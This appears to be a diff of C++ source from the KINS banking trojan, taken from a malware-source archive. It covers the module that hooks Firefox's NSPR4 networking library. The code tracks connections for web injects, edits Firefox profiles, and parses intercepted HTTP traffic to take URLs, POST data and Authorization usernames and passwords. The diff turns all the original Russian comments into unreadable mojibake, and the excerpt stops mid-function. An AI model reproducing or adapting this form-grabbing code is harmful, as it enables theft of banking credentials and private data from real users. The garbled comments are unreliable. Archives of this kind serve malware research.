@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <shlobj.h>
 #include <wininet.h>
@@ -31,7 +42,7 @@
 #define CACHE_ALIGN __declspec(align(CACHE_LINE))
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
-// Некотрое подобие структур из NSPR4.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ NSPR4.
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 #define PR_POLL_READ   0x01
 #define PR_POLL_WRITE  0x02
@@ -47,34 +58,34 @@ typedef enum
   PR_SUCCESS = 0
 }PRStatus;
 
-//Хэндл nspr4.dll
+//пїЅпїЅпїЅпїЅпїЅ nspr4.dll
 static HMODULE handle;
 
-//Функция создания сокета. 
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. 
 typedef void *(__cdecl *PR_OPENTCPSOCKET)(int af);
 static PR_OPENTCPSOCKET prOpenTcpSocket;
 
-//Функция закрытия хэндлов.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 typedef PRStatus (__cdecl *PR_CLOSE)(void *fd);
 static PR_CLOSE prClose;
 
-//Функция чтения.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 typedef int (__cdecl *PR_READ)(void *fd, void *buf, __int32 amount);
 static PR_READ prRead;
 
-//Функция записи.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 typedef int (__cdecl *PR_WRITE)(void *fd, const void *buf, __int32 amount);
 static PR_WRITE prWrite;
 
-//Получение типа сокета.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 typedef char *(__cdecl *PR_GETNAMEFORIDENTITY)(int ident);
 static PR_GETNAMEFORIDENTITY prGetNameForIdentity;
 
-//Установка ошибки.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 typedef void (__cdecl *PR_SETERROR)(__int32 errorCode, __int32 oserr);
 static PR_SETERROR prSetError;
 
-//Получение ошибки.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 typedef __int32 (__cdecl *PR_GETERROR)(void);
 static PR_GETERROR prGetError;
 
@@ -83,22 +94,22 @@ typedef __int32 (__cdecl *PR_POLL)(PRPOLLDESC *pds, int npds, unsigned __int32 t
 static PR_POLL prPoll;
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
-// Таблица соединений.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 
 typedef struct
 {
-	PRFILEDESC *fd;							//Хэндл соединения.
-	LPSTR url;								//Текущая URL. Заполнячться только для инжекта.
-	__int32 writeBytesToSkip;				//Количетсво байт которые нужно проигнорировать в PR_Write().
+	PRFILEDESC *fd;							//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	LPSTR url;								//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ URL. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	__int32 writeBytesToSkip;				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ PR_Write().
 
-	HttpGrabber::INJECTFULLDATA *injects;	//Список ижектов, применяемых для соединения.
-	DWORD injectsCount;						//Кол. элементов в injects.
+	HttpGrabber::INJECTFULLDATA *injects;	//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	DWORD injectsCount;						//пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ injects.
 
 	bool bCaptcha;							// indicates if request is for captcha or not
 
-	LPBYTE response;						//Буфер для накопления данных возращенных от сервера.
-	__int32 responseSize;					//Размер response.
+	LPBYTE response;						//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	__int32 responseSize;					//пїЅпїЅпїЅпїЅпїЅпїЅ response.
 
 	struct
 	{
@@ -106,14 +117,14 @@ typedef struct
 		__int32 size;
 		__int32 pos;
 		__int32 realSize;
-	}pendingRequest; //Данные ожидаемые для отправки от каллера PR_Write().
+	}pendingRequest; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ PR_Write().
 
 	struct
 	{
 		void *buf;
 		__int32 size;
 		__int32 pos;
-	}pendingResponse; //Данные ожидаемые для отправки каллеру PR_Read().
+	}pendingResponse; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ PR_Read().
 	
 }NSPR4CONNECTION;
 
@@ -264,30 +275,30 @@ static void connectionRemove(NSPR4CONNECTION *oldConnection)
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 /*
-	Кэлбэк enumProfiles().
+	пїЅпїЅпїЅпїЅпїЅпїЅ enumProfiles().
 
-	IN path  - полный путь профиля.
-	IN param - произволный параметр.
+	IN path  - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	IN param - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-	Return   - true - для продолжения поиска,
-			  false - для прерывания поиска.
+	Return   - true - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+			  false - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 typedef bool (ENUMPROFILESPROC)(const LPWSTR path, void *param);
 
 /*
-	Перечелсение всех профилей текущего юзера.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-	IN proc  - кэллбэк.
-	IN param - произволный параметр для кээлбэка.
+	IN proc  - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	IN param - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void enumProfiles(ENUMPROFILESPROC proc, void *param)
 {
-	//Получем домашнию директорию.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	WCHAR firefoxHome[MAX_PATH];
 	CSTR_GETW(firefoxPath, nspr4_firefox_home_path);
 	if(CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, firefoxHome) == S_OK && Fs::_pathCombine(firefoxHome, firefoxHome, firefoxPath))
 	{
-		//Получаем список профилей.
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		WCHAR profilesFile[MAX_PATH];
 
 		CSTR_GETW(profilesBaseName, nspr4_firefox_file_profiles);
@@ -303,7 +314,7 @@ static void enumProfiles(ENUMPROFILESPROC proc, void *param)
 
 			for(BYTE i = 0; i < 250; i++)
 			{
-				//Получаем данные текущего профиля.
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 				if(Str::_sprintfW(section, sizeof(section) / sizeof(WCHAR), keyProfileIdFormat, i) < 1 ||
 					(isRelative = CWA(kernel32, GetPrivateProfileIntW)(section, keyProfileRelative, (INT)(UINT)-1, profilesFile)) == (UINT)-1
 					)break;
@@ -311,8 +322,8 @@ static void enumProfiles(ENUMPROFILESPROC proc, void *param)
 				if(CWA(kernel32, GetPrivateProfileStringW)(section, keyProfilePath, NULL, profilePath, sizeof(profilePath) / sizeof(WCHAR), profilesFile) == 0)continue;
 				Fs::_normalizeSlashes(profilePath);
 
-				//Вызываем кээлбэк.
-				if(isRelative == 1) //Именно жестоко 1, согласно коду firefox.
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+				if(isRelative == 1) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 1, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ firefox.
 				{
 					WCHAR fullPath[MAX_PATH];
 					if(Fs::_pathCombine(fullPath, firefoxHome, profilePath) && !proc(fullPath, param))break;
@@ -372,7 +383,7 @@ static bool enumProfilesForUserJs(const LPWSTR path, void *param)
 void Nspr4Hook::init(void)
 {
 	CSTR_GETW(nspr4dll, nspr4_nspr4dll);
-	if(coreDllData.integrityLevel > Process::INTEGRITY_LOW && CWA(kernel32, GetModuleHandleW)(nspr4dll) != NULL) //При текущей сборке firefox, данный способ приемлем.
+	if(coreDllData.integrityLevel > Process::INTEGRITY_LOW && CWA(kernel32, GetModuleHandleW)(nspr4dll) != NULL) //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ firefox, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	{
 		enumProfiles(enumProfilesForUserJs, NULL);
 	}
@@ -419,15 +430,15 @@ void Nspr4Hook::updateAddresses(HMODULE moduleHandle, void *openTcpSocket, void 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 
 /*
-  Заполнение HttpGrabber::REQUESTDATA.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HttpGrabber::REQUESTDATA.
 
-  OUT requestData - структура. Если (requestData->handle == NULL) запрос нужно проигнорировать.
-  IN fd           - хэндл запроса.
-  IN data         - данные.
-  IN dataSize     - размер данных.
+  OUT requestData - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ (requestData->handle == NULL) пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN fd           - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN data         - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN dataSize     - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return          -  кол. байт, через котороу нужно начать обрабатывать следущий запрос,
-                    (DWORD)-1 - в случаи ошибки, дальнейший парсинг соединения делать нельзя.
+  Return          -  пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                    (DWORD)-1 - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILEDESC *fd, const void *data, DWORD dataSize)
 {
@@ -448,7 +459,7 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
 
 	Mem::_zero(requestData, sizeof(HttpGrabber::REQUESTDATA));
 
-	//Проверяем ключевые данные.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 	if((version  = HttpTools::_getMimeHeader(data, dataSize, (LPSTR)HttpTools::GMH_REQUEST_HTTP_VERSION, &versionSize))  == NULL || Str::_CompareA(version, "HTTP/1.", 7, 7) != 0 ||
 		(uri      = HttpTools::_getMimeHeader(data, dataSize, (LPSTR)HttpTools::GMH_HTTP_URI,     &uriSize))      == NULL || uriSize == 0    ||
 		(method   = HttpTools::_getMimeHeader(data, dataSize, (LPSTR)HttpTools::GMH_HTTP_METHOD,  &methodSize))   == NULL || methodSize == 0 ||
@@ -456,10 +467,10 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
 		(postData = HttpTools::_getMimeHeader(data, dataSize, (LPSTR)HttpTools::GMH_DATA,         &postDataSize)) == NULL) 
 
 	{
-		return (DWORD)-1; //Ошибка протокола.
+		return (DWORD)-1; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	}
 
-	//Вычисляем сколько байт нужно пропустить, до начала слежения следующего запроса.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	DWORD bytesToSkip = 0;
 	if((tmp = HttpTools::_getMimeHeader(data, dataSize, "Content-Length", &tmpSize)) != NULL)
 	{
@@ -479,7 +490,7 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
 	}
 	else if(postDataSize != 0)
 	{
-		//Длины нет, а POST-данные есть... Ошибка.
+		//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅ POST-пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ... пїЅпїЅпїЅпїЅпїЅпїЅ.
 		return (DWORD)-1;  
 	}
 
@@ -487,7 +498,7 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
 	WDEBUG2(WDDT_INFO, "bytesToSkip=%i, postDataSize=%i", bytesToSkip, postDataSize);  
 #endif
 
-	//Теперь заполняем структуру нормально.
+	//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	{
 		requestData->flags = HttpGrabber::RDF_NSPR4; 
 
@@ -498,25 +509,25 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
 			LPSTR scheme     = "http://";
 			DWORD schemeSize = 7;
 
-			//Определяем HTTPS.
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTTPS.
 			if(fd->identity > 0 && (scheme = prGetNameForIdentity(fd->identity)) != NULL && Mem::_compare(scheme, "NSS layer", 9) == 0)
 			{
 				scheme     = "https://";
 				schemeSize = 8;
 			}
 
-			requestData->url = (LPSTR)Mem::alloc(8/*scheme*/ + hostSize + 1/*слеш*/ + uriSize);
+			requestData->url = (LPSTR)Mem::alloc(8/*scheme*/ + hostSize + 1/*пїЅпїЅпїЅпїЅ*/ + uriSize);
 			if(requestData->url == NULL)return bytesToSkip;
 
 			//Scheme
 			Mem::_copy(requestData->url, scheme, schemeSize);
 			requestData->urlSize = schemeSize;
 
-			//Хост. Порт является частью хоста.
+			//пїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 			Mem::_copy(requestData->url + requestData->urlSize, host, hostSize);
 			requestData->urlSize += hostSize;
 
-			//Слеш
+			//пїЅпїЅпїЅпїЅ
 			if(*uri != '/')requestData->url[requestData->urlSize++] = '/';
 
 			//URI.
@@ -526,7 +537,7 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
 			requestData->url[requestData->urlSize] = 0;
 		}
 
-		//Реферер.
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		if((tmp = HttpTools::_getMimeHeader(data, dataSize, "Referer", &tmpSize)) != NULL && tmpSize > 0)
 		{
 			requestData->referer     = Str::_CopyExA(tmp, tmpSize);
@@ -551,7 +562,7 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
 			requestData->postDataSize = postDataSize;
 		}
 		
-		//Получаем данные авторизации.
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		if((tmp = HttpTools::_getMimeHeader(data, dataSize, "Authorization", &tmpSize)) != NULL && tmpSize > 0)
 		{
 			if(!HttpTools::_parseAuthorization(tmp, tmpSize, &requestData->authorizationData.userName, &requestData->authorizationData.password))
@@ -560,10 +571,10 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
 			}
 		}		
 
-		//Текущая конфигурация.
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		requestData->currentConfig = coreDllData.currentConfig;
 
-		//Хэндл запроса. Признак, что запрос нужно обробатывать.
+		//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		requestData->handle = (void *)fd;
 	}
 
@@ -571,37 +582,37 @@ static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILE
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
-// Анализ HTTP.
+// пїЅпїЅпїЅпїЅпїЅпїЅ HTTP.
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 
-//Флаги HTTPREQUESTINFO.flags.
+//пїЅпїЅпїЅпїЅпїЅ HTTPREQUESTINFO.flags.
 enum
 {
-	HRIF_DEFINED_CLOSE   = 0x1, //Соединение закрывается после отпарвки ответа.
-	HRIF_DEFINED_CHUNKED = 0x2, //Контент идет в формате chunked.
-	HRIF_DEFINED_LENGTH  = 0x4  //Размер контента известен.
+	HRIF_DEFINED_CLOSE   = 0x1, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+	HRIF_DEFINED_CHUNKED = 0x2, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ chunked.
+	HRIF_DEFINED_LENGTH  = 0x4  //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 };
 
-//Информация о запросе.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 typedef struct
 {
-	DWORD flags;         //Флаги HRIF_*.
-	DWORD contentLength; //Размер контента.
-	DWORD contentOffset; //Позиция контента от начала запроса.
-	DWORD contentEndOffset; //Позиция конца конетнта (идекс байта уже не пренадлежащего запросу.)
+	DWORD flags;         //пїЅпїЅпїЅпїЅпїЅ HRIF_*.
+	DWORD contentLength; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	DWORD contentOffset; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	DWORD contentEndOffset; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.)
 }HTTPREQUESTINFO;
 
 /*
-	Анализ HTTP-заголовка.
+	пїЅпїЅпїЅпїЅпїЅпїЅ HTTP-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-	OUT info       - данные.
-	IN request     - запрос.
-	IN requestSize - размер request.
+	OUT info       - пїЅпїЅпїЅпїЅпїЅпїЅ.
+	IN request     - пїЅпїЅпїЅпїЅпїЅпїЅ.
+	IN requestSize - пїЅпїЅпїЅпїЅпїЅпїЅ request.
 
 
-	Return         -  1 - заголовок прочитан,
-	0 - заголовок еще не прочитан.
-	-1 - ошибка/ответ не интересен
+	Return         -  1 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+	0 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	-1 - пїЅпїЅпїЅпїЅпїЅпїЅ/пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 */
 static int analizeHttpResponse(HTTPREQUESTINFO *info, const void *request, DWORD requestSize)
 {
@@ -620,7 +631,7 @@ static int analizeHttpResponse(HTTPREQUESTINFO *info, const void *request, DWORD
 	LPSTR header;
 	DWORD headerSize;
 
-	//Версия.
+	//пїЅпїЅпїЅпїЅпїЅпїЅ.
 	header = HttpTools::_getMimeHeader(request, requestSize, (LPSTR)HttpTools::GMH_RESPONSE_HTTP_VERSION, &headerSize);
 	if(header == NULL || headerSize != 8 || Str::_CompareA("HTTP/1.", header, 7, 7) != 0)
 	{
@@ -632,7 +643,7 @@ static int analizeHttpResponse(HTTPREQUESTINFO *info, const void *request, DWORD
 		return -1;
 	}
 
-	//Код.
+	//пїЅпїЅпїЅ.
 	header = HttpTools::_getMimeHeader(request, requestSize, (LPSTR)HttpTools::GMH_RESPONSE_STATUS, &headerSize);
 	if(header == NULL || !(header[0] == '2' && header[1] == '0' && header[2] == '0'))
 	{
@@ -679,7 +690,7 @@ static int analizeHttpResponse(HTTPREQUESTINFO *info, const void *request, DWORD
 
 	//Connection: close
 	if(((header = HttpTools::_getMimeHeader(request, requestSize, "Connection", &headerSize)) != NULL && headerSize == 5 && Str::_CompareA("close", header, 5, 5) == 0) ||
-		//Proxy-Connection: close, не уверен что в этом есть смысл.  
+		//Proxy-Connection: close, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.  
 		(header = HttpTools::_getMimeHeader(request, requestSize, "Proxy-Connection", &headerSize)) != NULL && headerSize == 5 && Str::_CompareA("close", header, 5, 5) == 0)
 	{
 		info->flags |= HRIF_DEFINED_CLOSE;
@@ -697,25 +708,25 @@ static int analizeHttpResponse(HTTPREQUESTINFO *info, const void *request, DWORD
 }
 
 /*
-	Анналлиз контента.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   
-	IN OUT info     - данные.
-	IN request      - запрос.
-	IN requestSize  - размер request.
-	IN isClose      - true - получено событие Close от сервера.
-	OUT content     - контент. Выделяется только при возращении 1.
-	OUT contentSize - размер content.
+	IN OUT info     - пїЅпїЅпїЅпїЅпїЅпїЅ.
+	IN request      - пїЅпїЅпїЅпїЅпїЅпїЅ.
+	IN requestSize  - пїЅпїЅпїЅпїЅпїЅпїЅ request.
+	IN isClose      - true - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Close пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	OUT content     - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 1.
+	OUT contentSize - пїЅпїЅпїЅпїЅпїЅпїЅ content.
 
-	Return          -  1 - контент прочитан,
-						0 - контент еще не прочитан.
-					-1 - ошибка/ответ не интересен
+	Return          -  1 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+						0 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+					-1 - пїЅпїЅпїЅпїЅпїЅпїЅ/пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 */
 static int analizeHttpResponseBody(HTTPREQUESTINFO *info, const LPBYTE buffer, DWORD bufferSize, bool isClose, void **content, LPDWORD contentSize)
 {
 	DWORD curSize = bufferSize - info->contentOffset;
 	if(info->flags & HRIF_DEFINED_LENGTH)
 	{
-		//Не получены все байты контента.
